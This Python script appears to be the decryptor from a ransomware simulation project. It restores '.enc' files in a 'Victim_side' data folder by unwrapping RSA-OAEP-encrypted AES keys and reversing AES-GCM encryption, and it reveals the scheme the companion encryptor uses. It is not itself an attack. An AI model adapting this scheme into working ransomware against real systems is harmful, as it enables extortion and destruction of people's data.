import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding

# DATA_FOLDER = "../../Victim_side/Data"
BASE_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "Victim_side"))
DATA_FOLDER = os.path.join(BASE_PATH, "Data")
# PRIVATE_KEY_FILE = "asym_private_key.pem"
PRIVATE_KEY_FILE = os.path.join(os.path.dirname(__file__), "asym_private_key.pem")

def load_rsa_private_key():
    try:
        with open(PRIVATE_KEY_FILE, "rb") as f:
            key_data = f.read()

        private_key = serialization.load_pem_private_key(key_data,password=None)
        return private_key

    except FileNotFoundError:
        # print("[ERROR] Private key file not found!")
        # exit()
        return None
    except Exception as e:
        print(f"[ERROR] Failed to load private key: {e}")
        # exit()


def decrypt_file(filepath, filename, private_key):
    try:
        with open(filepath, "rb") as f:
            filedata = f.read()
    except Exception as e:
        print(f"[ERROR] Cannot read {filename}: {e}")
        return

    try:
        # 1. Parse encrypted format
        nonce = filedata[:12]
        key_len = int.from_bytes(filedata[12:16], "big")
        encrypted_key = filedata[16:16 + key_len]
        ciphertext = filedata[16 + key_len:]

        # 2. RSA decrypt AES key
        try:
            aes_key = private_key.decrypt(
                encrypted_key,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )

        except Exception as e:
            print(f"[ERROR] RSA decryption failed for {filename}: {e}")
            return

        aesgcm = AESGCM(aes_key)

        # 3. AES-GCM decrypt content
        try:
            plaintext = aesgcm.decrypt(nonce, ciphertext, None)
        except Exception as e:
            print(f"[ERROR] AES decryption failed for {filename}: {e}")
            return

        # Output name (remove .enc)
        original_name = filename.replace(".enc", "")

        out_path = os.path.join(DATA_FOLDER, original_name)

        # Write decrypted file
        with open(out_path, "wb") as f:
            f.write(plaintext)

        # Delete encrypted .enc file (overwrite)
        try:
            os.remove(filepath)
        except Exception as e:
            print(f"[WARNING] Failed to delete encrypted file {filename}: {e}")
            
        print(f"[✓] Decrypted : {filename} → {original_name}")

        # Optional: wipe AES key from memory
        aes_key = b"\x00" * len(aes_key)

    except Exception as e:
        print(f"[ERROR] Decryption failed for {filename}: {e}")


def decrypt_all_files(private_key):
    try:
        if not os.path.exists(DATA_FOLDER):
            print(f"[!] Folder '{DATA_FOLDER}' not found.")
            return

        files = [f for f in os.listdir(DATA_FOLDER)
                 if os.path.isfile(os.path.join(DATA_FOLDER, f))]

        enc_files = [f for f in files if f.endswith(".enc")]

        if not enc_files:
            print(f"[!] No .enc files found in {DATA_FOLDER} folder.")
            return

        print(f"\n=== Decrypting all .enc files in '{DATA_FOLDER}/' ===")

        for filename in enc_files:
            filepath = os.path.join(DATA_FOLDER, filename)
            decrypt_file(filepath, filename, private_key)

        print("\n[✓] Decryption completed.")

    except Exception as e:
        print(f"[FATAL ERROR] Unexpected error: {e}")
        exit()


if __name__ == "__main__":
    private_key = load_rsa_private_key()
    decrypt_all_files(private_key)
